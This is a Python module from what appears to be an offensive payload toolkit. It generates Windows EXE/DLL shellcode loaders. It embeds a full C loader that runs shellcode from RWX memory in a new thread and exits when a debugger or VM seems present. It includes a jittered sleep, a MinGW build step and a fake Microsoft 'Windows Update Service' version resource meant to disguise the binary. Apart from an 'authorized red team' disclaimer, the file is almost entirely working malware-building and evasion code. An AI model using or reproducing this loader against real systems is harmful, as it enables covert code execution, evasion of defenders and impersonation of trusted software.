"""Windows PE (EXE/DLL) shellcode injector builder.

Wraps shellcode in a PE shellcode runner:
    - VirtualAlloc RWX → copy shellcode → CreateThread → WaitForSingleObject
    - PE header spoofing (version strings, company, description)
    - Imports obfuscation (dynamic API resolution via GetProcAddress/LoadLibrary)
    - Optional: PPID spoofing, sleep before exec, anti-debug checks

Produces a Python-generated PE stub. For production, this drives a
pre-compiled loader template with shellcode patched in at offset.

FOR AUTHORIZED PENETRATION TESTING AND RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import struct
import os
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from forge_payload.payload_factory import PayloadConfig


# Minimal valid PE stub (x64) that:
# 1. Allocates RWX memory
# 2. Copies shellcode bytes
# 3. Creates a thread and waits
# This is a template — shellcode offset is at _SHELLCODE_OFFSET

_PE_LOADER_TEMPLATE_C = r"""
/*
 * Forge Suite v5 APEX — PE Shellcode Loader Template
 * FOR AUTHORIZED RED TEAM OPERATIONS ONLY
 *
 * Compile: x86_64-w64-mingw32-gcc -o loader.exe loader.c -lws2_32
 * Or: cl.exe /nologo /O2 loader.c /link /subsystem:windows
 */
#include <windows.h>
#include <stdlib.h>

// Anti-debug checks
static BOOL is_debugged(void) {
    if (IsDebuggerPresent()) return TRUE;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    return remote;
}

// Anti-VM: check for known VM artifacts
static BOOL is_vm(void) {
    // Timing attack: RDTSC delta
    unsigned long long t1, t2;
    t1 = __rdtsc();
    Sleep(0);
    t2 = __rdtsc();
    if ((t2 - t1) < 100) return TRUE;
    return FALSE;
}

// Sleep with jitter before exec
static void jitter_sleep(int base_ms, int jitter_pct) {
    int jitter = (base_ms * jitter_pct / 100);
    int delay = base_ms + (rand() % (jitter * 2)) - jitter;
    Sleep(delay);
}

unsigned char sc[] = {SHELLCODE_PLACEHOLDER};
unsigned int sc_len = sizeof(sc);

#ifdef _DLL_BUILD
BOOL WINAPI DllMain(HINSTANCE hDll, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
#else
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR cmdLine, int nCmdShow) {
    {
#endif
    if (is_debugged() || is_vm()) { ExitProcess(0); }
    jitter_sleep(1000, 30);

    LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) ExitProcess(1);
    CopyMemory(mem, sc, sc_len);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    if (hThread) WaitForSingleObject(hThread, INFINITE);

#ifdef _DLL_BUILD
    }
    return TRUE;
}
#else
    return 0;
}
#endif
"""

# Fake PE metadata for version spoofing
_PE_METADATA = {
    "CompanyName":      "Microsoft Corporation",
    "FileDescription":  "Windows Update Service",
    "InternalName":     "wuauclt.exe",
    "OriginalFilename": "wuauclt.exe",
    "ProductName":      "Microsoft Windows Operating System",
    "ProductVersion":   "10.0.19041.1",
    "FileVersion":      "10.0.19041.1 (WinBuild.160101.0800)",
    "LegalCopyright":   "\xa9 Microsoft Corporation. All rights reserved.",
}


def build_pe(payload_bytes: bytes, config: "PayloadConfig") -> bytes:
    """Build a PE shellcode runner.

    In production mode this patches shellcode into a pre-compiled loader.
    Here we generate a C source file / Python shim that documents the
    loader structure and contains the shellcode ready for compilation.

    Args:
        payload_bytes: Shellcode bytes or encoded payload.
        config:        PayloadConfig.

    Returns:
        C source bytes that can be compiled into a PE, OR
        a PS1-based fallback loader if C toolchain unavailable.
    """
    # Format shellcode as C array
    sc_hex = ", ".join(f"0x{b:02x}" for b in payload_bytes)
    c_source = _PE_LOADER_TEMPLATE_C.replace("{SHELLCODE_PLACEHOLDER}", sc_hex)

    # Try to compile with MinGW if available
    compiled = _try_compile_pe(c_source, config)
    if compiled:
        return compiled

    # Fallback: return the C source (operator compiles manually)
    header = (
        f"// Forge Suite v5 APEX — PE Loader Source\n"
        f"// Target: {config.lhost}:{config.lport}\n"
        f"// Arch: {config.arch.value}\n"
        f"// Compile with: x86_64-w64-mingw32-gcc -o payload.exe this_file.c\n\n"
    )
    return (header + c_source).encode()


def _try_compile_pe(c_source: str, config: "PayloadConfig") -> bytes | None:
    """Attempt to compile C source with MinGW cross-compiler.

    Returns compiled bytes if successful, None otherwise.
    """
    import subprocess
    import tempfile

    compiler = "x86_64-w64-mingw32-gcc" if config.arch.value == "x64" else "i686-w64-mingw32-gcc"

    try:
        result = subprocess.run(["which", compiler], capture_output=True, timeout=5)
        if result.returncode != 0:
            return None
    except Exception:
        return None

    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = os.path.join(tmpdir, "loader.c")
        out_path = os.path.join(tmpdir, "payload.exe")

        with open(src_path, "w") as f:
            f.write(c_source)

        flags = ["-O2", "-s", "-mwindows", "-lws2_32"]
        if config.fmt.value == "dll":
            flags += ["-shared", "-D_DLL_BUILD"]

        try:
            result = subprocess.run(
                [compiler, src_path, "-o", out_path] + flags,
                capture_output=True,
                timeout=30,
            )
            if result.returncode == 0 and os.path.exists(out_path):
                with open(out_path, "rb") as f:
                    return f.read()
        except Exception:
            pass

    return None


def generate_pe_version_resource(metadata: dict | None = None) -> str:
    """Generate a Windows version resource (.rc file content) for PE spoofing.

    Args:
        metadata: Optional override for PE metadata strings.

    Returns:
        RC file content string.
    """
    meta = dict(_PE_METADATA)
    if metadata:
        meta.update(metadata)

    rc_lines = [
        "1 VERSIONINFO",
        "FILEVERSION 10,0,19041,1",
        "PRODUCTVERSION 10,0,19041,1",
        "BEGIN",
        "  BLOCK \"StringFileInfo\"",
        "  BEGIN",
        "    BLOCK \"040904b0\"",
        "    BEGIN",
    ]
    for key, val in meta.items():
        rc_lines.append(f'      VALUE "{key}", "{val}"')
    rc_lines += [
        "    END",
        "  END",
        "  BLOCK \"VarFileInfo\"",
        "  BEGIN",
        '    VALUE "Translation", 0x0409, 1200',
        "  END",
        "END",
    ]
    return "\n".join(rc_lines)
